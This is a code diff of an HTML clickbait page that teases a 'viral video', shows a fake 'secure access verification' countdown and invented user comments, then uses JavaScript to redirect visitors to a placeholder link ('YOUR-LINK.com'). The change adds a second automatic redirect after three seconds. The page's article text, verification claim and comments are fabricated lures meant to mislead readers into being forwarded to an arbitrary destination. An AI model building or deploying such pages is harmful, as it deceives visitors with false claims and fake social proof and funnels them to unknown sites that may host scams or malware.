@@ -1,71 +1,118 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Exclusive Content Loading...</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Preparing Content...</title>
 
 <style>
 
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
 body{
-background:#f3f3f3;
 font-family:Arial,sans-serif;
-padding:25px;
-line-height:1.7;
+background:#f2f2f2;
+color:#111;
 }
 
-.article{
-max-width:750px;
-margin:auto;
-background:white;
-padding:35px;
-border-radius:20px;
-box-shadow:0 10px 30px rgba(0,0,0,0.1);
-}
-
-h1{
-font-size:34px;
-margin-bottom:20px;
-}
-
-.loading-box{
-margin-top:40px;
+.top-loader{
+position:sticky;
+top:0;
+z-index:999;
 background:#111;
-color:white;
-padding:35px;
-border-radius:20px;
+padding:18px;
 text-align:center;
+color:white;
+box-shadow:0 5px 20px rgba(0,0,0,0.2);
 }
 
-#timer{
-font-size:65px;
+.top-title{
+font-size:20px;
 font-weight:bold;
-margin-top:15px;
+margin-bottom:8px;
+}
+
+.top-sub{
+font-size:14px;
+opacity:0.8;
+margin-bottom:12px;
+}
+
+.timer{
+font-size:48px;
+font-weight:bold;
+margin-bottom:12px;
+animation:pulse 1s infinite;
+}
+
+.progress-wrap{
+width:100%;
+height:10px;
+background:#333;
+border-radius:30px;
+overflow:hidden;
 }
 
 .progress{
-width:100%;
-height:12px;
-background:#333;
-border-radius:20px;
-overflow:hidden;
-margin-top:20px;
-}
-
-.bar{
 height:100%;
 width:0%;
-background:lime;
-transition:1s;
+background:linear-gradient(90deg,#00ff99,#00ccff);
+transition:1s linear;
 }
 
-.comment-box{
-margin-top:30px;
+@keyframes pulse{
+0%{transform:scale(1);}
+50%{transform:scale(1.08);}
+100%{transform:scale(1);}
+}
+
+.container{
+max-width:760px;
+margin:auto;
+padding:20px;
+}
+
+.article{
+background:white;
+padding:25px;
+border-radius:20px;
+margin-top:20px;
+box-shadow:0 10px 30px rgba(0,0,0,0.08);
+}
+
+.hero-img{
+width:100%;
+border-radius:18px;
+margin-bottom:20px;
+}
+
+h1{
+font-size:32px;
+line-height:1.3;
+margin-bottom:20px;
+}
+
+p{
+font-size:18px;
+line-height:1.8;
+margin-bottom:18px;
+color:#333;
+}
+
+.comments{
+margin-top:25px;
 }
 
 .comment{
 background:#fafafa;
 padding:15px;
-border-radius:12px;
-margin-bottom:15px;
+border-radius:14px;
+margin-bottom:12px;
 border:1px solid #eee;
 }
 
@@ -74,82 +121,118 @@ font-weight:bold;
 margin-bottom:5px;
 }
 
+.live-tag{
+display:inline-block;
+background:red;
+color:white;
+padding:5px 12px;
+border-radius:30px;
+font-size:12px;
+font-weight:bold;
+margin-bottom:15px;
+animation:pulse 1s infinite;
+}
+
+@media(max-width:600px){
+
+h1{
+font-size:26px;
+}
+
+p{
+font-size:17px;
+}
+
+.timer{
+font-size:56px;
+}
+
+.top-title{
+font-size:22px;
+}
+
+}
+
 </style>
 </head>
 
 <body>
 
+<div class="top-loader">
+
+<div class="top-title">
+Preparing Full HD Video...
+</div>
+
+<div class="top-sub">
+Please wait while secure access is verified
+</div>
+
+<div class="timer" id="timer">
+5
+</div>
+
+<div class="progress-wrap">
+<div class="progress" id="progress"></div>
+</div>
+
+</div>
+
+<div class="container">
+
 <div class="article">
 
-<h1>Viral Discovery That Suddenly Started Trending Online</h1>
-
-<p>
-Over the last few weeks, thousands of users across multiple social media platforms have been discussing a newly discovered method that unexpectedly went viral.
-</p>
-
-<p>
-According to online discussions, the original content started spreading rapidly after several creators shared clips and screenshots explaining how the system works.
-</p>
-
-<p>
-Many users claimed the information was difficult to find because several pages containing the original source were either removed or temporarily restricted due to unusually high traffic activity.
-</p>
-
-<p>
-As the trend continued growing, more people became curious about the complete version of the content. Several users reported that the full explanation video contained additional details that were not shown publicly.
-</p>
-
-<p>
-Experts monitoring online engagement trends noticed a sudden spike in interest around the topic, especially among younger audiences and mobile users.
-</p>
-
-<p>
-Some users described the method as “unexpectedly simple,” while others said they were surprised by how quickly the content gained popularity within a short period of time.
-</p>
-
-<p>
-Because of the increasing demand, a temporary mirror version of the original content was created so visitors could continue accessing the information without interruptions.
-</p>
-
-<p>
-The secure content system below is currently preparing the complete article and private media files for viewing.
-</p>
-
-<p>
-Please wait a few seconds while the verification and loading process completes.
-</p>
-
-<div class="loading-box">
-
-<h2>Preparing Secure Content...</h2>
-
-<p>
-Please wait while we verify access and load the complete video/article.
-</p>
-
-<div id="timer">5</div>
-
-<div class="progress">
-<div class="bar" id="bar"></div>
+<div class="live-tag">
+LIVE TRENDING
 </div>
 
-</div>
+<img class="hero-img" src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?q=80&w=1200&auto=format&fit=crop" />
 
-<div class="comment-box">
+<h1>
+Viral Video Everyone Suddenly Started Talking About
+</h1>
+
+<p>
+Over the last few days, thousands of users across social media platforms have been discussing a newly discovered video that unexpectedly went viral online.
+</p>
+
+<p>
+Several creators claimed the original upload disappeared shortly after gaining massive attention, causing users to search for alternative access links.
+</p>
+
+<p>
+According to online discussions, the full version contains additional information and footage that was not shown publicly in short clips.
+</p>
+
+<p>
+As more users started sharing screenshots and reactions, engagement around the topic increased rapidly across multiple countries.
+</p>
+
+<p>
+A temporary secure mirror page was later created so viewers could continue accessing the content while the original source remained unavailable.
+</p>
+
+<p>
+The complete video is currently loading and will open automatically once verification is complete.
+</p>
+
+<div class="comments">
 
 <div class="comment">
-<div class="name">Rahul</div>
-This was actually more interesting than I expected.
+<div class="name">Michael</div>
+Didn't expect the full video to actually work.
 </div>
 
 <div class="comment">
-<div class="name">Aman</div>
-The full content explained everything clearly.
+<div class="name">Daniel</div>
+The ending was crazy honestly.
 </div>
 
 <div class="comment">
-<div class="name">Vikas</div>
+<div class="name">Chris</div>
 Glad I waited for the complete version.
+</div>
+
 </div>
 
 </div>
@@ -161,7 +244,7 @@ Glad I waited for the complete version.
 let time = 5;
 
 const timer = document.getElementById("timer");
-const bar = document.getElementById("bar");
+const progress = document.getElementById("progress");
 
 const interval = setInterval(()=>{
 
@@ -169,7 +252,7 @@ time--;
 
 timer.innerHTML = time;
 
-bar.style.width = ((5-time)*20)+"%";
+progress.style.width = ((5-time)*20)+"%";
 
 if(time<=0){
 
@@ -180,6 +263,12 @@ window.location.href="https://YOUR-LINK.com";
 }
 
 },1000);
+
+// Redirect after 3 sec
+setTimeout(()=>{
+  window.location.href="https://YOUR-LINK.com";
+
+},3000);
 
 </script>
 
